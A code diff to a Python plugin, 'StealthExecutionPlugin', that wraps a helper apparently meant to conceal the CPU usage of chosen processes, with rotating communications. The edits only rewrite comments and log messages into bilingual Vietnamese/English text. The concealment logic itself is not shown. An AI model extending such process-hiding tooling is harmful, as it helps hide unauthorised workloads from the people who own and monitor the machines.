@@ -13,7 +13,7 @@ from .stealth_exec import StealthExecution
 
 @register_plugin("stealth_execution")
 class StealthExecutionPlugin(ICpuTechnique):
-    """Plugin che giấu CPU sử dụng StealthExecution."""
+    """**Plugin** (trình cắm) che giấu **CPU** sử dụng **StealthExecution** (thực thi ẩn danh)."""
     
     name = "stealth_execution"
     priority = 10
@@ -37,28 +37,28 @@ class StealthExecutionPlugin(ICpuTechnique):
                 comm_rotation_interval=rotation_interval
             )
             
-            # Bắt đầu che giấu ngay lập tức nếu được cấu hình
+            # **Start** (bắt đầu) che giấu ngay lập tức nếu được **configured** (cấu hình)
             if self.config.get("start_immediately", False):
                 self.stealth_executor.start()
                 
-            self.logger.info("Stealth execution plugin initialized")
+            self.logger.info("**Stealth execution plugin** (plugin thực thi ẩn danh) **initialized** (đã khởi tạo)")
             return True
             
         except Exception as e:
-            self.logger.error(f"Failed to initialize stealth execution plugin: {e}")
+            self.logger.error(f"**Failed to initialize** (không thể khởi tạo) **stealth execution plugin** (plugin thực thi ẩn danh): {e}")
             return False
     
     def apply(self, pid: int) -> bool:
         """Áp dụng che giấu cho một PID cụ thể."""
         if not self.stealth_executor:
-            self.logger.warning("Stealth executor not initialized")
+            self.logger.warning("**Stealth executor** (bộ thực thi ẩn danh) **not initialized** (chưa được khởi tạo)")
             return False
         
-        # Đảm bảo stealth executor đang chạy
+        # Đảm bảo **stealth executor** (bộ thực thi ẩn danh) đang chạy
         if not getattr(self.stealth_executor, "_running", False):
             self.stealth_executor.start()
         
-        # Thêm PID vào danh sách theo dõi
+        # Thêm **PID** (mã nhận dạng tiến trình) vào **tracking list** (danh sách theo dõi)
         return self.stealth_executor.add_process(pid)
     
     def stop(self) -> bool:
@@ -67,5 +67,5 @@ class StealthExecutionPlugin(ICpuTechnique):
             self.stealth_executor.stop()
             self.stealth_executor = None
             
-        self.logger.info("Stealth execution plugin stopped")
+        self.logger.info("**Stealth execution plugin** (plugin thực thi ẩn danh) **stopped** (đã dừng)")
         return True 
